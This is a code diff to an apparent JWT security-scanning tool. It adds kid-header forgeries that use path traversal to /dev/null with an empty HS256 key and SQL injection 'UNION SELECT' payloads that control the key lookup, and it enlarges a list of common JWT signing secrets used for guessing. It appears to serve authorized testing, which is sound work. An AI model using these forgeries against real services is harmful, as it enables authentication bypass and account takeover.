@@ -14,6 +14,8 @@ endpoint ignores auth:
                           PUBLIC key (fetched from a JWKS/cert endpoint) as the HMAC secret; a
                           server that treats the key by name alone will accept it.
 
+  * kid header           — path traversal (kid=/dev/null -> empty key, sign HS256 with "") and
+                          SQL injection (key lookup returns an attacker value) forgeries.
   * jwk / x5c header     — self-signed key injection (CVE-2018-0114): forge an RSA keypair, embed
                           its public JWK (or a self-signed x5c cert chain) in the token header and
                           sign RS256 with the matching private key; a server that trusts the key
@@ -35,10 +37,24 @@ import secrets as _secrets
 from collections.abc import Callable
 
 # common JWT signing secrets (deliberately small + high-signal; app-specific words added later)
-_SECRETS = ("secret", "password", "123456", "changeme", "jwt", "key", "token", "admin",
-            "qwerty", "test", "secretkey", "supersecret", "your-256-bit-secret", "s3cr3t",
-            "mysecret", "jwtsecret", "privatekey", "default", "hmac", "shared-secret", "root",
-            "letmein", "12345678", "secret123", "password123", "jwt-secret", "please-change")
+_SECRETS = (
+    # curated common JWT HMAC secrets (public 'jwt.secrets' style list; app words added at runtime)
+    "secret", "secret1", "secretkey", "secret123", "secretsecret", "Secret", "SECRET", "password",
+    "password1", "password123", "passw0rd", "p@ssw0rd", "Password1", "Password123", "123456",
+    "1234567890", "12345678", "123456789", "changeme", "change-me", "changeit", "please-change",
+    "jwt", "jwtsecret", "jwt_secret", "jwt-secret", "jwtkey", "key", "keyboardcat", "token",
+    "admin", "administrator", "qwerty", "test", "test123", "supersecret", "super_secret",
+    "your-256-bit-secret", "your_jwt_secret", "your-secret", "mysecret", "mysecretkey",
+    "my-secret-key", "privatekey", "private", "private_key", "default", "hmac", "shared-secret",
+    "sharedsecret", "root", "letmein", "topsecret", "verysecret", "bigsecret", "signingkey",
+    "signing_key", "signature", "secretpassword", "s3cr3t", "s3cr3tk3y", "master", "masterkey",
+    "access", "accesskey", "apikey", "api_key", "api", "auth", "authsecret", "sesame",
+    "opensesame", "trustno1", "hunter2", "iloveyou", "welcome", "ninja", "abc123", "demo", "dev",
+    "development", "staging", "production", "prod", "example", "foo", "bar", "foobar", "hello",
+    "helloworld", "zxcvbn", "asdf", "asdfgh", "1q2w3e4r", "1qaz2wsx", "qazwsx", "123qwe",
+    "0000", "00000000", "111111", "123123", "monkey", "dragon", "sunshine", "superman",
+    "batman", "football", "baseball", "michael", "pass", "passwd", "nopass", "null", "none",
+    "undefined", "0", "1", "true", "secret_key_123", "CHANGEME", "spring.jwt.secret")
 # where a server may leak the RSA public key (for RS->HS confusion)
 _KEY_PATHS = ("/.well-known/jwks.json", "/jwks.json", "/jwks", "/.well-known/openid-configuration",
               "/api/auth/jwt/.well-known/jwks.json", "/public.pem", "/publickey", "/public_key",
@@ -373,6 +389,39 @@ def _rsa_forgeries(header: dict, payload: dict, sandbox, target, log):
         pass
 
 
+# kid-header path-traversal targets that resolve to an EMPTY key (so HS256 with "" verifies)
+_KID_PATHS = ("../../../../../../../../../../dev/null", "/dev/null",
+              "....//....//....//....//....//dev/null",
+              "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fdev/null")
+
+
+def _kid_sqli_pairs():
+    """kid SQL-injection payloads that make the key lookup return an attacker-chosen value, with
+    the key tried both raw and base64-decoded (servers differ on how they use the returned row)."""
+    kb = "b3dsZm9yZ2U="          # base64("owlforge")
+    for tmpl in ("nonexistent' UNION SELECT '{k}'-- -", "x' UNION SELECT '{k}'#",
+                 "zzz' UNION SELECT '{k}", "' UNION SELECT '{k}'-- -"):
+        kid = tmpl.format(k=kb)
+        yield kid, kb.encode()                     # server uses the returned string verbatim
+        try:
+            yield kid, base64.urlsafe_b64decode(kb + "=" * (-len(kb) % 4))  # server b64-decodes it
+        except Exception:
+            pass
+
+
+def _kid_forgeries(header, payload):
+    """kid-header forgeries, signed HS256 so the server's key lookup decides acceptance:
+    (a) PATH TRAVERSAL -> kid points at /dev/null, the key is empty, sign with an empty secret;
+    (b) SQL INJECTION -> the key lookup returns a value we control, sign with it."""
+    esc = _escalate(payload)
+    base = {k: v for k, v in header.items() if k.lower() not in ("jwk", "jku", "x5c", "x5u")}
+    for kp in _KID_PATHS:
+        yield f"kid header path traversal (kid={kp})", \
+            _hs(dict(base, alg="HS256", kid=kp), esc, b"", "sha256")
+    for kid, key in _kid_sqli_pairs():
+        yield "kid header SQL injection", _hs(dict(base, alg="HS256", kid=kid), esc, key, "sha256")
+
+
 def _file(assessment_id, url, kind, token, forged, detail, log):
     from owlforge.store.db import session
     from owlforge.store.models import Finding
@@ -542,6 +591,13 @@ def jwt_attack_scan(assessment_id, inventory, sandbox, session_headers=None,
                                   "An RSA-family forgery was accepted (confusion or header-"
                                   "carried key).", log)
                             filed += 1
+                for kind, forged in _kid_forgeries(header, payload):
+                    if _accepted(sandbox, oracle["url"], session_headers, token, forged, oracle):
+                        _file(assessment_id, oracle["url"], kind, token, forged,
+                              "A kid-header forgery was accepted (key loaded from an attacker-"
+                              "controlled path or SQL-injected value).", log)
+                        filed += 1
+                        break
             # 'unverified signature' class: runs with OR without the reject-bad-sig oracle, since a
             # server that ignores the signature makes that oracle impossible to find.
             filed += _unverified_sig_scan(assessment_id, sandbox, inventory, target,
